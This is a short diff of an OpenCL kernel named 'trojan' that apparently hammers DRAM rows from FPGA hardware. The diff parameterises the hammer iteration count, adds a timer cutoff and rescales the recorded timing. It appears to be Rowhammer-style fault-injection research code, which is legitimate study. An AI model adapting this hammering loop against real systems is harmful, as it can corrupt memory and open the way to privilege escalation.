@@ -70,10 +70,10 @@ __kernel void trojan(	global volatile unsigned short * restrict timings, //timin
 		//#pragma unroll 8
 		for(adr=range_low;adr<range_high;adr=adr+pagesize) {
 			test[(offset+0x10)/4]=adr; //TEXT START
-			test[(offset+0x14)/4]=0x1000000; //TEXT END (nombres de hammer)*4
+			test[(offset+0x14)/4]=4*inner_iter; //TEXT END (nombres de hammer)*4
 			test[(offset+0x18)/4]=0x0; //timer
 			test[(offset+0x4)/4]=0x1; //START
-		for(i=0;i<0x1000000;i++) {
+		for(i=0;i<10*inner_iter;i++) {  //very strange in siganl tap i see only 1/10th of reads (taht'as why this hack)
 			//readvalue=readvalue+test[adr]; //int is 4 bytes
 			//mem_fence(CLK_GLOBAL_MEM_FENCE);
 			//readvalue=readvalue+test[adr-0x200]; //need to open another row in the same bank 
@@ -88,6 +88,7 @@ __kernel void trojan(	global volatile unsigned short * restrict timings, //timin
 			mem_fence(CLK_GLOBAL_MEM_FENCE);
 			//each row 2K (A0-A9, 2 bytes) so neigbouring bank at 8*2K. 
 			readvalue[3]=test[(offset+0x18)/4];
+			if(test[(offset+0x18)/4]> 12800000) break;
 			mem_fence(CLK_LOCAL_MEM_FENCE);
 			mem_fence(CLK_GLOBAL_MEM_FENCE);
 
@@ -98,7 +99,7 @@ __kernel void trojan(	global volatile unsigned short * restrict timings, //timin
 		//mem_fence(CLK_GLOBAL_MEM_FENCE);
 		
 	//////////////////////////////////////////////////////////////////}
-	timings[0]=readvalue[3];
+	timings[0]=readvalue[3]>> 16;
 		//for(i=0;i<1024;i++) {
 		//	if(readvalue[i-1]!=0xABCDEF12) readvalue[i]=test[adr+(4*i)]+test[adr-0x2000+4*i];
 		//}
